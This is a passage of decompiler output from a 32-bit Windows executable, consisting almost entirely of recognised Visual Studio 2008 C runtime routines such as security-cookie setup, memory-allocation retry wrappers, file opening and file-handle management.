  local_c.dwLowDateTime = 0;
  local_c.dwHighDateTime = 0;
  if ((DAT_00422044 == 0xbb40e64e) || ((DAT_00422044 & 0xffff0000) == 0)) {
    GetSystemTimeAsFileTime(&local_c);
    uVar4 = local_c.dwHighDateTime ^ local_c.dwLowDateTime;
    DVar1 = GetCurrentProcessId();
    DVar2 = GetCurrentThreadId();
    DVar3 = GetTickCount();
    QueryPerformanceCounter(&local_14);
    DAT_00422044 = uVar4 ^ DVar1 ^ DVar2 ^ DVar3 ^ local_14.s.HighPart ^ local_14.s.LowPart;
    if (DAT_00422044 == 0xbb40e64e) {
      DAT_00422044 = 0xbb40e64f;
    }
    else if ((DAT_00422044 & 0xffff0000) == 0) {
      DAT_00422044 = DAT_00422044 | DAT_00422044 << 0x10;
    }
    DAT_00422048 = ~DAT_00422044;
  }
  else {
    DAT_00422048 = ~DAT_00422044;
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_004138a1(void)

{
  _DAT_00425754 = 0;
  return;
}



// Library Function - Single Match
//  __malloc_crt
// 
// Library: Visual Studio 2008 Release

void * __cdecl __malloc_crt(size_t _Size)

{
  void *pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    pvVar1 = _malloc(_Size);
    if (pvVar1 != (void *)0x0) {
      return pvVar1;
    }
    if (DAT_004243fc == 0) break;
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_004243fc < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (void *)0x0;
    }
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  __calloc_crt
// 
// Library: Visual Studio 2008 Release

void * __cdecl __calloc_crt(size_t _Count,size_t _Size)

{
  int *piVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    piVar1 = __calloc_impl(_Count,_Size,(undefined4 *)0x0);
    if (piVar1 != (int *)0x0) {
      return piVar1;
    }
    if (DAT_004243fc == 0) break;
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_004243fc < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (void *)0x0;
    }
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  __realloc_crt
// 
// Library: Visual Studio 2008 Release

void * __cdecl __realloc_crt(void *_Ptr,size_t _NewSize)

{
  void *pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  do {
    pvVar1 = _realloc(_Ptr,_NewSize);
    if (pvVar1 != (void *)0x0) {
      return pvVar1;
    }
    if (_NewSize == 0) {
      return (void *)0x0;
    }
    if (DAT_004243fc == 0) {
      return (void *)0x0;
    }
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_004243fc < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
  } while (dwMilliseconds != 0xffffffff);
  return (void *)0x0;
}



// Library Function - Single Match
//  __tsopen_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl
__tsopen_nolock(undefined4 *param_1,LPCWSTR param_2,uint param_3,int param_4,byte param_5)

{
  byte *pbVar1;
  byte bVar2;
  uint *in_EAX;
  errno_t eVar3;
  uint uVar4;
  ulong *puVar5;
  int *piVar6;
  DWORD DVar7;
  long lVar8;
  int iVar9;
  HANDLE pvVar10;
  byte bVar11;
  int unaff_EDI;
  int iVar12;
  bool bVar13;
  longlong lVar14;
  _SECURITY_ATTRIBUTES local_38;
  undefined4 local_28;
  uint local_24;
  HANDLE local_20;
  uint local_1c;
  DWORD local_18;
  uint local_14;
  uint local_10;
  uint local_c;
  byte local_7;
  byte local_6;
  byte local_5;
  
  bVar13 = (param_3 & 0x80) == 0;
  local_24 = 0;
  local_6 = 0;
  local_38.nLength = 0xc;
  local_38.lpSecurityDescriptor = (LPVOID)0x0;
  if (bVar13) {
    local_5 = 0;
  }
  else {
    local_5 = 0x10;
  }
  local_38.bInheritHandle = (BOOL)bVar13;
  eVar3 = __get_fmode((int *)&local_24);
  if (eVar3 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  if (((param_3 & 0x8000) == 0) && (((param_3 & 0x74000) != 0 || (local_24 != 0x8000)))) {
    local_5 = local_5 | 0x80;
  }
  uVar4 = param_3 & 3;
  if (uVar4 == 0) {
    local_c = 0x80000000;
  }
  else {
    if (uVar4 == 1) {
      if (((param_3 & 8) == 0) || ((param_3 & 0x70000) == 0)) {
        local_c = 0x40000000;
        goto LAB_00413af4;
      }
    }
    else if (uVar4 != 2) goto LAB_00413ab0;
    local_c = 0xc0000000;
  }
LAB_00413af4:
  if (param_4 == 0x10) {
    local_14 = 0;
  }
  else if (param_4 == 0x20) {
    local_14 = 1;
  }
  else if (param_4 == 0x30) {
    local_14 = 2;
  }
  else if (param_4 == 0x40) {
    local_14 = 3;
  }
  else {
    if (param_4 != 0x80) goto LAB_00413ab0;
    local_14 = (uint)(local_c == 0x80000000);
  }
  uVar4 = param_3 & 0x700;
  if (uVar4 < 0x401) {
    if ((uVar4 == 0x400) || (uVar4 == 0)) {
      local_18 = 3;
    }
    else if (uVar4 == 0x100) {
      local_18 = 4;
    }
    else {
      if (uVar4 == 0x200) goto LAB_00413bf9;
      if (uVar4 != 0x300) goto LAB_00413ab0;
      local_18 = 2;
    }
  }
  else {
    if (uVar4 != 0x500) {
      if (uVar4 == 0x600) {
LAB_00413bf9:
        local_18 = 5;
        goto LAB_00413ba8;
      }
      if (uVar4 != 0x700) {
LAB_00413ab0:
        puVar5 = ___doserrno();
        *puVar5 = 0;
        *in_EAX = 0xffffffff;
        piVar6 = __errno();
        *piVar6 = 0x16;
        __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        return 0x16;
      }
    }
    local_18 = 1;
  }
LAB_00413ba8:
  local_10 = 0x80;
  if (((param_3 & 0x100) != 0) && (-1 < (char)(~(byte)DAT_00423e58 & param_5))) {
    local_10 = 1;
  }
  if ((param_3 & 0x40) != 0) {
    local_10 = local_10 | 0x4000000;
    local_c = local_c | 0x10000;
    local_14 = local_14 | 4;
  }
  if ((param_3 & 0x1000) != 0) {
    local_10 = local_10 | 0x100;
  }
  if ((param_3 & 0x20) == 0) {
    if ((param_3 & 0x10) != 0) {
      local_10 = local_10 | 0x10000000;
    }
  }
  else {
    local_10 = local_10 | 0x8000000;
  }
  uVar4 = __alloc_osfhnd();
  *in_EAX = uVar4;
  if (uVar4 == 0xffffffff) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    *in_EAX = 0xffffffff;
    piVar6 = __errno();
    *piVar6 = 0x18;
    goto LAB_00413cc1;
  }
  *param_1 = 1;
  local_20 = CreateFileW(param_2,local_c,local_14,&local_38,local_18,local_10,(HANDLE)0x0);
  if (local_20 == (HANDLE)0xffffffff) {
    if (((local_c & 0xc0000000) == 0xc0000000) && ((param_3 & 1) != 0)) {
      local_c = local_c & 0x7fffffff;
      local_20 = CreateFileW(param_2,local_c,local_14,&local_38,local_18,local_10,(HANDLE)0x0);
      if (local_20 != (HANDLE)0xffffffff) goto LAB_00413ccd;
    }
    pbVar1 = (byte *)((&DAT_004257a0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 & 0xfe;
    DVar7 = GetLastError();
    __dosmaperr(DVar7);
    goto LAB_00413cc1;
  }
LAB_00413ccd:
  DVar7 = GetFileType(local_20);
  if (DVar7 == 0) {
    pbVar1 = (byte *)((&DAT_004257a0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 & 0xfe;
    DVar7 = GetLastError();
    __dosmaperr(DVar7);
    CloseHandle(local_20);
    if (DVar7 == 0) {
      piVar6 = __errno();
      *piVar6 = 0xd;
    }
    goto LAB_00413cc1;
  }
  if (DVar7 == 2) {
    local_5 = local_5 | 0x40;
  }
  else if (DVar7 == 3) {
    local_5 = local_5 | 8;
  }
  __set_osfhnd(*in_EAX,(intptr_t)local_20);
  bVar11 = local_5 | 1;
  *(byte *)((&DAT_004257a0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40) = bVar11;
  pbVar1 = (byte *)((&DAT_004257a0)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = *pbVar1 & 0x80;
  local_7 = local_5 & 0x48;
  if (local_7 == 0) {
    bVar2 = local_5 & 0x80;
    local_5 = bVar11;
    if (bVar2 == 0) goto LAB_00414042;
    if ((param_3 & 2) == 0) goto LAB_00413e08;
    local_1c = __lseek_nolock(*in_EAX,-1,2);
    if (local_1c == 0xffffffff) {
      puVar5 = ___doserrno();
      bVar11 = local_5;
      if (*puVar5 == 0x83) goto LAB_00413e08;
    }
    else {
      local_28 = 0;
      iVar12 = __read_nolock(*in_EAX,&local_28,1);
      if ((((iVar12 != 0) || ((short)local_28 != 0x1a)) ||
          (iVar12 = __chsize_nolock(*in_EAX,CONCAT44(unaff_EDI,(int)local_1c >> 0x1f)), iVar12 != -1
          )) && (lVar8 = __lseek_nolock(*in_EAX,0,0), bVar11 = local_5, lVar8 != -1))
      goto LAB_00413e08;
    }
LAB_00413dba:
    __close_nolock(*in_EAX);
    goto LAB_00413cc1;
  }
LAB_00413e08:
  local_5 = bVar11;
  if ((local_5 & 0x80) != 0) {
    if ((param_3 & 0x74000) == 0) {
      if ((local_24 & 0x74000) == 0) {
        param_3 = param_3 | 0x4000;
      }
      else {
        param_3 = param_3 | local_24 & 0x74000;
      }
    }
    uVar4 = param_3 & 0x74000;
    if (uVar4 == 0x4000) {
      local_6 = 0;
    }
    else if ((uVar4 == 0x10000) || (uVar4 == 0x14000)) {
      if ((param_3 & 0x301) == 0x301) goto LAB_00413e77;
    }
    else if ((uVar4 == 0x20000) || (uVar4 == 0x24000)) {
LAB_00413e77:
      local_6 = 2;
    }
    else if ((uVar4 == 0x40000) || (uVar4 == 0x44000)) {
      local_6 = 1;
    }
    if (((param_3 & 0x70000) != 0) && (local_1c = 0, (local_5 & 0x40) == 0)) {
      uVar4 = local_c & 0xc0000000;
      if (uVar4 == 0x40000000) {
        if (local_18 == 0) goto LAB_00414042;
        if (2 < local_18) {
          if (local_18 < 5) {
            lVar14 = __lseeki64_nolock(*in_EAX,0x200000000,unaff_EDI);
            if (lVar14 == 0) goto LAB_00413edc;
            lVar14 = __lseeki64_nolock(*in_EAX,0,unaff_EDI);
            uVar4 = (uint)lVar14 & (uint)((ulonglong)lVar14 >> 0x20);
            goto LAB_00413fa8;
          }
LAB_00413ed3:
          if (local_18 != 5) goto LAB_00414042;
        }
LAB_00413edc:
        iVar12 = 0;
        if (local_6 == 1) {
          local_1c = 0xbfbbef;
          local_18 = 3;
        }
        else {
          if (local_6 != 2) goto LAB_00414042;
          local_1c = 0xfeff;
          local_18 = 2;
        }
        do {
          iVar9 = __write(*in_EAX,(void *)((int)&local_1c + iVar12),local_18 - iVar12);
          if (iVar9 == -1) goto LAB_00413dba;
          iVar12 = iVar12 + iVar9;
        } while (iVar12 < (int)local_18);
      }
      else {
        if (uVar4 != 0x80000000) {
          if ((uVar4 == 0xc0000000) && (local_18 != 0)) {
            if (2 < local_18) {
              if (4 < local_18) goto LAB_00413ed3;
              lVar14 = __lseeki64_nolock(*in_EAX,0x200000000,unaff_EDI);
              if (lVar14 != 0) {
                lVar14 = __lseeki64_nolock(*in_EAX,0,unaff_EDI);
                if (lVar14 == -1) goto LAB_00413dba;
                goto LAB_00413f2d;
              }
            }
            goto LAB_00413edc;
          }
          goto LAB_00414042;
        }
LAB_00413f2d:
        iVar12 = __read_nolock(*in_EAX,&local_1c,3);
        if (iVar12 == -1) goto LAB_00413dba;
        if (iVar12 == 2) {
LAB_00413fb6:
          if ((local_1c & 0xffff) == 0xfffe) {
            __close_nolock(*in_EAX);
            piVar6 = __errno();
            *piVar6 = 0x16;
            return 0x16;
          }
          if ((local_1c & 0xffff) == 0xfeff) {
            lVar8 = __lseek_nolock(*in_EAX,2,0);
            if (lVar8 == -1) goto LAB_00413dba;
            local_6 = 2;
            goto LAB_00414042;
          }
        }
        else if (iVar12 == 3) {
          if (local_1c == 0xbfbbef) {
            local_6 = 1;
            goto LAB_00414042;
          }
          goto LAB_00413fb6;
        }
        uVar4 = __lseek_nolock(*in_EAX,0,0);
LAB_00413fa8:
        if (uVar4 == 0xffffffff) goto LAB_00413dba;
      }
    }
  }
LAB_00414042:
  uVar4 = local_c;
  pbVar1 = (byte *)((&DAT_004257a0)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = *pbVar1 ^ (*pbVar1 ^ local_6) & 0x7f;
  pbVar1 = (byte *)((&DAT_004257a0)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = (char)(param_3 >> 0x10) << 7 | *pbVar1 & 0x7f;
  if ((local_7 == 0) && ((param_3 & 8) != 0)) {
    pbVar1 = (byte *)((&DAT_004257a0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 | 0x20;
  }
  if (((local_c & 0xc0000000) == 0xc0000000) && ((param_3 & 1) != 0)) {
    CloseHandle(local_20);
    pvVar10 = CreateFileW(param_2,uVar4 & 0x7fffffff,local_14,&local_38,3,local_10,(HANDLE)0x0);
    if (pvVar10 == (HANDLE)0xffffffff) {
      DVar7 = GetLastError();
      __dosmaperr(DVar7);
      pbVar1 = (byte *)((&DAT_004257a0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
      *pbVar1 = *pbVar1 & 0xfe;
      __free_osfhnd(*in_EAX);
LAB_00413cc1:
      piVar6 = __errno();
      return *piVar6;
    }
    *(HANDLE *)((*in_EAX & 0x1f) * 0x40 + (&DAT_004257a0)[(int)*in_EAX >> 5]) = pvVar10;
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __wsopen_helper
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl
__wsopen_helper(wchar_t *_Filename,int _OFlag,int _ShFlag,int _PMode,int *_PFileHandle,int _BSecure)

{
  int *piVar1;
  errno_t eVar2;
  undefined4 local_20 [5];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_00420690;
  uStack_c = 0x414153;
  local_20[0] = 0;
  if (((_PFileHandle == (int *)0x0) || (*_PFileHandle = -1, _Filename == (wchar_t *)0x0)) ||
     ((_BSecure != 0 && ((_PMode & 0xfffffe7fU) != 0)))) {
    piVar1 = __errno();
    eVar2 = 0x16;
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    local_8 = (undefined *)0x0;
    eVar2 = __tsopen_nolock(local_20,_Filename,_OFlag,_ShFlag,(byte)_PMode);
    local_8 = (undefined *)0xfffffffe;
    FUN_004141e5();
    if (eVar2 != 0) {
      *_PFileHandle = -1;
    }
  }
  return eVar2;
}



void FUN_004141e5(void)

{
  byte *pbVar1;
  int unaff_EBP;
  int unaff_ESI;
  uint *unaff_EDI;
  
  if (*(int *)(unaff_EBP + -0x1c) != unaff_ESI) {
    if (*(int *)(unaff_EBP + -0x20) != unaff_ESI) {
      pbVar1 = (byte *)((&DAT_004257a0)[(int)*unaff_EDI >> 5] + 4 + (*unaff_EDI & 0x1f) * 0x40);
      *pbVar1 = *pbVar1 & 0xfe;
    }
    __unlock_fhandle(*unaff_EDI);
  }
  return;
}



// Library Function - Single Match
//  __wsopen_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl
__wsopen_s(int *_FileHandle,wchar_t *_Filename,int _OpenFlag,int _ShareFlag,int _PermissionFlag)

{
  errno_t eVar1;
  
  eVar1 = __wsopen_helper(_Filename,_OpenFlag,_ShareFlag,_PermissionFlag,_FileHandle,1);
  return eVar1;
}



// Library Function - Single Match
//  __wcsnicmp_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __wcsnicmp_l(wchar_t *_Str1,wchar_t *_Str2,size_t _MaxCount,_locale_t _Locale)

{
  wchar_t wVar1;
  wchar_t wVar2;
  wint_t wVar3;
  wint_t wVar4;
  int iVar5;
  int *piVar6;
  uint uVar7;
  uint uVar8;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  iVar5 = 0;
  if (_MaxCount != 0) {
    if ((_Str1 == (wchar_t *)0x0) || (_Str2 == (wchar_t *)0x0)) {
      piVar6 = __errno();
      *piVar6 = 0x16;
      __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      iVar5 = 0x7fffffff;
    }
    else {
      _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
      if ((local_14.locinfo)->lc_category[0].wlocale == (wchar_t *)0x0) {
        do {
          wVar1 = *_Str1;
          if ((0x40 < (ushort)wVar1) && ((ushort)wVar1 < 0x5b)) {
            wVar1 = wVar1 + L' ';
          }
          uVar8 = (uint)(ushort)wVar1;
          wVar2 = *_Str2;
          if ((0x40 < (ushort)wVar2) && ((ushort)wVar2 < 0x5b)) {
            wVar2 = wVar2 + L' ';
          }
          _Str1 = _Str1 + 1;
          _Str2 = _Str2 + 1;
          _MaxCount = _MaxCount - 1;
          uVar7 = (uint)(ushort)wVar2;
        } while (((_MaxCount != 0) && (wVar1 != L'\0')) && (wVar1 == wVar2));
      }
      else {
        do {
          wVar3 = __towlower_l(*_Str1,&local_14);
          uVar8 = (uint)wVar3;
          wVar4 = __towlower_l(*_Str2,&local_14);
          _Str1 = _Str1 + 1;
          _Str2 = _Str2 + 1;
          _MaxCount = _MaxCount - 1;
          uVar7 = (uint)wVar4;
          if ((_MaxCount == 0) || (wVar3 == 0)) break;
        } while (wVar3 == wVar4);
      }
      iVar5 = uVar8 - uVar7;
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
    }
  }
  return iVar5;
}



// Library Function - Single Match
//  __wcsnicmp
// 
// Library: Visual Studio 2008 Release

int __cdecl __wcsnicmp(wchar_t *_Str1,wchar_t *_Str2,size_t _MaxCount)

{
  wchar_t wVar1;
  wchar_t wVar2;
  int iVar3;
  int *piVar4;
  
  if (DAT_004241c8 == 0) {
    iVar3 = 0;
    if (_MaxCount != 0) {
      if ((_Str1 == (wchar_t *)0x0) || (_Str2 == (wchar_t *)0x0)) {
        piVar4 = __errno();
        *piVar4 = 0x16;
        __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        iVar3 = 0x7fffffff;
      }
      else {
        do {
          wVar1 = *_Str1;
          if ((0x40 < (ushort)wVar1) && ((ushort)wVar1 < 0x5b)) {
            wVar1 = wVar1 + L' ';
          }
          wVar2 = *_Str2;
          if ((0x40 < (ushort)wVar2) && ((ushort)wVar2 < 0x5b)) {
            wVar2 = wVar2 + L' ';
          }
          _Str1 = _Str1 + 1;
          _Str2 = _Str2 + 1;
          _MaxCount = _MaxCount - 1;
        } while (((_MaxCount != 0) && (wVar1 != L'\0')) && (wVar1 == wVar2));
        iVar3 = (uint)(ushort)wVar1 - (uint)(ushort)wVar2;
      }
    }
  }
  else {
    iVar3 = __wcsnicmp_l(_Str1,_Str2,_MaxCount,(_locale_t)0x0);
  }
  return iVar3;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_004143c3(undefined4 param_1)

{
  _DAT_00424404 = param_1;
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___crtInitCritSecAndSpinCount
// 
// Library: Visual Studio 2008 Release

BOOL __cdecl ___crtInitCritSecAndSpinCount(LPCRITICAL_SECTION param_1,DWORD param_2)

{
  BOOL BVar1;
  
  BVar1 = InitializeCriticalSectionAndSpinCount(param_1,param_2);
  return BVar1;
}



// Library Function - Single Match
//  __ValidateImageBase
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

BOOL __cdecl __ValidateImageBase(PBYTE pImageBase)

{
  if ((*(short *)pImageBase == 0x5a4d) &&
     (*(int *)(pImageBase + *(int *)(pImageBase + 0x3c)) == 0x4550)) {
    return (uint)(*(short *)((int)(pImageBase + *(int *)(pImageBase + 0x3c)) + 0x18) == 0x10b);
  }
  return 0;
}



// Library Function - Single Match
//  __FindPESection
// 
// Library: Visual Studio 2008 Release

PIMAGE_SECTION_HEADER __cdecl __FindPESection(PBYTE pImageBase,DWORD_PTR rva)

{
  int iVar1;
  PIMAGE_SECTION_HEADER p_Var2;
  uint uVar3;
  
  iVar1 = *(int *)(pImageBase + 0x3c);
  uVar3 = 0;
  p_Var2 = (PIMAGE_SECTION_HEADER)
           (pImageBase + *(ushort *)(pImageBase + iVar1 + 0x14) + 0x18 + iVar1);
  if (*(ushort *)(pImageBase + iVar1 + 6) != 0) {
    do {
      if ((p_Var2->VirtualAddress <= rva) &&
         (rva < (p_Var2->Misc).PhysicalAddress + p_Var2->VirtualAddress)) {
        return p_Var2;
      }
      uVar3 = uVar3 + 1;
      p_Var2 = p_Var2 + 1;
    } while (uVar3 < *(ushort *)(pImageBase + iVar1 + 6));
  }
  return (PIMAGE_SECTION_HEADER)0x0;
}



// Library Function - Single Match
//  __IsNonwritableInCurrentImage
// 
// Library: Visual Studio 2008 Release

BOOL __cdecl __IsNonwritableInCurrentImage(PBYTE pTarget)

{
  BOOL BVar1;
  PIMAGE_SECTION_HEADER p_Var2;
  void *local_14;
  code *pcStack_10;
  uint local_c;
  undefined4 local_8;
  
  pcStack_10 = __except_handler4;
  local_14 = ExceptionList;
  local_c = DAT_00422044 ^ 0x4206d0;
  ExceptionList = &local_14;
  local_8 = 0;
  BVar1 = __ValidateImageBase((PBYTE)&IMAGE_DOS_HEADER_00400000);
  if (BVar1 != 0) {
    p_Var2 = __FindPESection((PBYTE)&IMAGE_DOS_HEADER_00400000,(DWORD_PTR)(pTarget + -0x400000));
    if (p_Var2 != (PIMAGE_SECTION_HEADER)0x0) {
      ExceptionList = local_14;
      return ~(p_Var2->Characteristics >> 0x1f) & 1;
    }
  }
  ExceptionList = local_14;
  return 0;
}



// Library Function - Single Match
//  __global_unwind2
// 
// Library: Visual Studio

void __cdecl __global_unwind2(PVOID param_1)

{
  RtlUnwind(param_1,(PVOID)0x4145a8,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



// Library Function - Single Match
//  __local_unwind2
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

void __cdecl __local_unwind2(int param_1,uint param_2)

{
  uint uVar1;
  void *local_20;
  undefined *puStack_1c;
  undefined4 local_18;
  int iStack_14;
  
  iStack_14 = param_1;
  puStack_1c = &LAB_004145b0;
  local_20 = ExceptionList;
  ExceptionList = &local_20;
  while( true ) {
    uVar1 = *(uint *)(param_1 + 0xc);
    if ((uVar1 == 0xffffffff) || ((param_2 != 0xffffffff && (uVar1 <= param_2)))) break;
    local_18 = *(undefined4 *)(*(int *)(param_1 + 8) + uVar1 * 0xc);
    *(undefined4 *)(param_1 + 0xc) = local_18;
    if (*(int *)(*(int *)(param_1 + 8) + 4 + uVar1 * 0xc) == 0) {
      __NLG_Notify(0x101);
      FUN_004146c4();
    }
  }
  ExceptionList = local_20;
  return;
}



// Library Function - Single Match
//  __NLG_Notify1
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

undefined4 __fastcall __NLG_Notify1(undefined4 param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_00422dc8 = param_1;
  DAT_00422dc4 = in_EAX;
  DAT_00422dcc = unaff_EBP;
  return in_EAX;
}



// Library Function - Single Match
//  __NLG_Notify
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

void __NLG_Notify(ulong param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_00422dc8 = param_1;
  DAT_00422dc4 = in_EAX;
  DAT_00422dcc = unaff_EBP;
  return;
}



void FUN_004146c4(void)

{
  code *in_EAX;
  
  (*in_EAX)();
  return;
}



// Library Function - Single Match
//  __set_osfhnd
// 
// Library: Visual Studio 2008 Release

int __cdecl __set_osfhnd(int param_1,intptr_t param_2)

{
  int *piVar1;
  ulong *puVar2;
  int iVar3;
  DWORD nStdHandle;
  
  if ((-1 < param_1) && ((uint)param_1 < DAT_00425788)) {
    iVar3 = (param_1 & 0x1fU) * 0x40;
    if (*(int *)(iVar3 + (&DAT_004257a0)[param_1 >> 5]) == -1) {
      if (DAT_00422040 == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_00414724;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)param_2);
      }
LAB_00414724:
      *(intptr_t *)(iVar3 + (&DAT_004257a0)[param_1 >> 5]) = param_2;
      return 0;
    }
  }
  piVar1 = __errno();
  *piVar1 = 9;
  puVar2 = ___doserrno();
  *puVar2 = 0;
  return -1;
}



// Library Function - Single Match
//  __free_osfhnd
// 
// Library: Visual Studio 2008 Release

int __cdecl __free_osfhnd(int param_1)

{
  int *piVar1;
  ulong *puVar2;
  int iVar3;
  DWORD nStdHandle;
  
  if ((-1 < param_1) && ((uint)param_1 < DAT_00425788)) {
    iVar3 = (param_1 & 0x1fU) * 0x40;
    piVar1 = (int *)((&DAT_004257a0)[param_1 >> 5] + iVar3);
    if (((*(byte *)(piVar1 + 1) & 1) != 0) && (*piVar1 != -1)) {
      if (DAT_00422040 == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_004147aa;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)0x0);
      }
LAB_004147aa:
      *(undefined4 *)(iVar3 + (&DAT_004257a0)[param_1 >> 5]) = 0xffffffff;
      return 0;
    }
  }
  piVar1 = __errno();
  *piVar1 = 9;
  puVar2 = ___doserrno();
  *puVar2 = 0;
  return -1;
}



// Library Function - Single Match
//  __get_osfhandle
// 
// Library: Visual Studio 2008 Release

intptr_t __cdecl __get_osfhandle(int _FileHandle)

{
  ulong *puVar1;
  int *piVar2;
  intptr_t *piVar3;
  intptr_t iVar4;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    return -1;
  }
  if (((_FileHandle < 0) || (DAT_00425788 <= (uint)_FileHandle)) ||
     (piVar3 = (intptr_t *)((_FileHandle & 0x1fU) * 0x40 + (&DAT_004257a0)[_FileHandle >> 5]),
     (*(byte *)(piVar3 + 1) & 1) == 0)) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar4 = -1;
  }
  else {
    iVar4 = *piVar3;
  }
  return iVar4;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___lock_fhandle
// 
// Library: Visual Studio 2008 Release

int __cdecl ___lock_fhandle(int _Filehandle)

{
  BOOL BVar1;
  int iVar2;
  uint local_20;
  
  iVar2 = (_Filehandle & 0x1fU) * 0x40 + (&DAT_004257a0)[_Filehandle >> 5];
  local_20 = 1;
  if (*(int *)(iVar2 + 8) == 0) {
    __lock(10);
    if (*(int *)(iVar2 + 8) == 0) {
      BVar1 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(iVar2 + 0xc),4000);
      local_20 = (uint)(BVar1 != 0);
      *(int *)(iVar2 + 8) = *(int *)(iVar2 + 8) + 1;
    }
    FUN_004148dc();
  }
  if (local_20 != 0) {
    EnterCriticalSection
              ((LPCRITICAL_SECTION)
               ((&DAT_004257a0)[_Filehandle >> 5] + 0xc + (_Filehandle & 0x1fU) * 0x40));
  }
  return local_20;
}



void FUN_004148dc(void)

{
  FUN_0040e2eb(10);
  return;
}



// Library Function - Single Match
//  __unlock_fhandle
// 
// Library: Visual Studio 2008 Release

void __cdecl __unlock_fhandle(int _Filehandle)

{
  LeaveCriticalSection
            ((LPCRITICAL_SECTION)
             ((&DAT_004257a0)[_Filehandle >> 5] + 0xc + (_Filehandle & 0x1fU) * 0x40));
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __alloc_osfhnd
// 
// Library: Visual Studio 2008 Release

int __cdecl __alloc_osfhnd(void)

{
  bool bVar1;
  int iVar2;
  BOOL BVar3;
  undefined4 *puVar4;
  int iVar5;
  int local_20;
  
  local_20 = -1;
  iVar5 = 0;
  bVar1 = false;
  iVar2 = __mtinitlocknum(0xb);
  if (iVar2 == 0) {
    local_20 = -1;
  }
